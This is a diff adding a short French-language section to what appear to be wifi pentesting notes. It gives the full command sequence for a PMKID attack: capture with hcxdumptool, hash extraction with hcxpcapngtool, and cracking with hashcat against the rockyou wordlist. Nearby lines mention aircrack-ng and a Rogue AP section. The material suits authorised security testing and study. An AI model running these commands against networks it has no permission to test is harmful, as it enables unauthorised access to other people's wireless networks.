@@ -266,6 +266,16 @@ aircrack-ng.exe -w wordlist.txt file.cap
 
 Outil : `hcxtools` ou `Bettercap` (wifi.assoc all).
 
+```sh
+# passage en mode monitor au préalable
+sudo apt update
+sudo apt install hcxtools hcxdumptool hashcat
+sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
+# une fois le PMKID, on extrait ensuite le hash
+hcxpcapngtool -o hash_pour_crack.22000 capture.pcapng
+hashcat -m 22000 hash_pour_crack.22000 /usr/share/wordlists/rockyou.txt
+```
+
 ### Rogue AP
 
 Alternative à `BetterCap` :
